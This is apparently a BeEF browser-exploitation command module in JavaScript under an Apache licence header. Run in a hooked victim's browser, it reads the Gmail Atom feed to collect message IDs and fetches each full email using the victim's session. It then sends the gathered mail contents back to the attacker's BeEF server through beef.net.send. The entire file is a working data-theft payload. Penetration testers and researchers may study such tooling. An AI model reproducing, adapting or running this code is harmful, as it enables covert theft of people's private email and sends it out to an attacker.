//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	var result; 

	try { 
		x = new XMLHttpRequest();
		x.open('get', 'https://mail.google.com/mail/feed/atom', false);
		x.send();

		str = x.responseText; var re = /message_id=([A-Z,a-z,0-9]*)/g;
		var match;
		while(match = re.exec(str)) {
			x = new XMLHttpRequest();
			x.open('get', 'https://mail.google.com/mail/u/0/h/?&v=om&th='+match[1]+'&f=1&f=1', false);
			x.send();
			result += x.responseText;
		}
  	
	} catch(e) { 
		for(var n in e) 
			result+= n + " " + e[n] + "\n"; 
	} 
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
});





 
